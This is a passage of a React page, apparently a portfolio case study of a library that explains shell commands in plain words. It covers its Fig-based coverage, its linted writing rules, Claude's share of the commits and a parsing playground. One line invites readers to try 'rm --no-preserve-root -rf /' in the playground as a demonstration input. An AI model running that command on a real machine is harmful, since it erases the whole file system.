                  program's widest row at <code>derived</code>, and{" "}
                  <code>unread</code> lists the words. Try{" "}
                  <code>rm --no-preserve-root -rf /</code> in the playground.
                </p>
              ),
            },
            {
              title: "Fig for grammar, never for facts",
              body: (
                <p>
                  Coverage is measured against Fig's autocomplete specs. As
                  of 0.5.0 the table answers for 125 of the 720 commands Fig
                  completes, plus 41 commands Fig has no spec for. A
                  spec knows which flags take a value, not what a command
                  does to a computer, so Fig only cross-checks the grammar
                  (zero conflicts) and every fact is still written by hand.
                </p>
              ),
            },
          ]}
        />
      </CaseSection>

      <CaseSection id="built" title="How I built it">
        <p>
          Schema first: the first commit defines the fact set, and the third
          turns the writing rules into tests. Every sentence in the table is
          linted — one sentence, under 150 characters, "folder" not
          "directory", no verdict about safety, and no string that could be
          lifted out and run. The register is enforced by{" "}
          <code>pnpm test</code>, not by review alone.
        </p>
        <p>
          Claude wrote most of the code: <strong>124 of the 155 commits</strong>{" "}
          carry its co-author line. My part was the spec and the refusals —
          deciding what this library must never do was most of the design.
        </p>
      </CaseSection>

      <CaseSection id="playground" title="Try it" wide={<Playground />}>
        <p>
          The same <code>explain()</code> this page has been calling all
          along, with the keyboard handed to you. Pipes, redirections,{" "}
          <code>sudo</code> and quoting are all read; substitutions are
          refused on purpose, because what <code>$(…)</code> stands for is not
          on the line, and a flag the table hasn't read is named rather than
          guessed at.
        </p>
      </CaseSection>

      <NextProject current="cmd-facts" />
    </>
  );
}
